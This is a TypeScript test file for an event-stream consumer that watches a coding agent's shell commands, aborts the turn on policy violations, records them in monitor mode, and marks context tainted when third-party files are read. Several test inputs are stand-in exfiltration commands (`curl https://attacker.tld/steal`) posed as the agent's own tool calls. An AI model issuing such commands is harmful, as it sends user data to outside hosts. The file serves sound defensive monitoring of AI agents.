import { describe, expect, it, vi } from "vitest";
import { freeze, platformCeiling } from "./capability.js";
import { CodexEventConsumer } from "./event-stream.js";
import type { RunnerEvent } from "../types.js";

const budget = freeze(
  platformCeiling("https://ark.cn-beijing.volces.com/api/v3", 40),
  "agent-1",
  "run-1",
  ["platform-ceiling"],
);

function makeConsumer(enforcement: "enforce" | "monitor" = "enforce") {
  const events: RunnerEvent[] = [];
  const onTerminalViolation = vi.fn();
  const consumer = new CodexEventConsumer({
    budget,
    workspaceMount: "/workspace",
    enforcement,
    onEvent: (event) => events.push(event),
    onTerminalViolation,
  });
  return { consumer, events, onTerminalViolation };
}

const line = (value: unknown) => JSON.stringify(value);
const commandStarted = (command: string) =>
  line({ type: "item.started", item: { type: "command_execution", command, status: "in_progress" } });
const commandCompleted = (command: string, output = "") =>
  line({
    type: "item.completed",
    item: { type: "command_execution", command, status: "completed", exit_code: 0, aggregated_output: output },
  });

describe("Codex event stream consumer", () => {
  it("still extracts the session, final message and usage", () => {
    const { consumer } = makeConsumer();
    consumer.consumeLine(line({ type: "thread.started", thread_id: "thread-123" }));
    consumer.consumeLine(line({ type: "item.completed", item: { type: "agent_message", text: "Done." } }));
    consumer.consumeLine(line({ type: "turn.completed", usage: { input_tokens: 10, output_tokens: 4 } }));
    expect(consumer.threadId).toBe("thread-123");
    expect(consumer.messages).toEqual(["Done."]);
    expect(consumer.usage).toEqual({ inputTokens: 10, outputTokens: 4 });
  });

  // The baseline dropped these events entirely, which is why V4 (no tool visibility)
  // existed. Every command must now surface.
  it("surfaces command executions the baseline discarded", () => {
    const { consumer, events } = makeConsumer();
    consumer.consumeLine(commandStarted("/bin/bash -lc 'ls -la'"));
    consumer.consumeLine(commandCompleted("/bin/bash -lc 'ls -la'", "total 0\n"));
    expect(events.map((event) => event.kind)).toEqual(["command.started", "command.completed"]);
    expect(consumer.commandCount).toBe(1);
  });

  it("aborts the turn on the first violating command", () => {
    const { consumer, events, onTerminalViolation } = makeConsumer();
    consumer.consumeLine(commandStarted("/bin/bash -lc 'curl https://attacker.tld/steal'"));
    expect(onTerminalViolation).toHaveBeenCalledOnce();
    expect(consumer.aborted).toBe(true);
    expect(consumer.violations.length).toBeGreaterThan(0);
    const violation = events.find((event) => event.kind === "policy.violation");
    expect(violation).toMatchObject({ terminal: true });
  });

  it("aborts only once even if further commands stream in before the kill lands", () => {
    const { consumer, onTerminalViolation } = makeConsumer();
    consumer.consumeLine(commandStarted("/bin/bash -lc 'curl https://attacker.tld/a'"));
    consumer.consumeLine(commandStarted("/bin/bash -lc 'curl https://attacker.tld/b'"));
    expect(onTerminalViolation).toHaveBeenCalledOnce();
  });

  it("records but does not abort in monitor mode", () => {
    const { consumer, onTerminalViolation } = makeConsumer("monitor");
    consumer.consumeLine(commandStarted("/bin/bash -lc 'curl https://attacker.tld/steal'"));
    expect(onTerminalViolation).not.toHaveBeenCalled();
    expect(consumer.aborted).toBe(false);
    expect(consumer.violations.length).toBeGreaterThan(0);
  });

  it("flags a turn that pulled third-party content into context", () => {
    const { consumer } = makeConsumer();
    consumer.consumeLine(commandStarted("/bin/bash -lc 'cat vendor/README.md'"));
    expect(consumer.tainted).toBe(true);
    expect([...consumer.taintReasons].join(" ")).toContain("third-party");
  });

  it("ignores malformed lines rather than throwing", () => {
    const { consumer } = makeConsumer();
    expect(() => consumer.consumeLine("{not json")).not.toThrow();
    expect(() => consumer.consumeLine("")).not.toThrow();
  });
});
